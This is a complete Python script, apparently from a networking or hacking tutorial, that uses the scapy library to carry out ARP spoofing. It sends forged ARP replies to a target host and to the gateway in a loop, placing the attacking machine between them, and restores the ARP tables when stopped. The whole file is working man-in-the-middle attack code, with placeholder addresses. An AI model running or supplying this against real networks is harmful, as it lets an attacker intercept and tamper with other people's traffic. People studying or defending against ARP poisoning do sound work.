import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        # we want only the first element (since we are not asking for a ip range, but for a single ip)
        # and the data we want will be at the index 1 of the found element
        # the mac will be at the hwsrc key
        return answered_list[0][1].hwsrc
    except IndexError:
        return None
    

old_target_mac = ""
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        old_target_mac = target_mac
    # as we are not specifying the source mac address (hwsrc) in the packet, scapy will assume that it is our mac (the attacking machine)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac or old_target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)
    
    
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # in this case we are specifying the source mac address (hwsrc), to restore it to the original value
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "000.000.000.000"
gateway_ip = "111.111.111.111"
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count+=2
        print("\r[+] Packets sent: {count}".format(count=sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Restoring ARP Tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
except:
    print("\n[+] An exception happened ..... Restoring ARP Tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)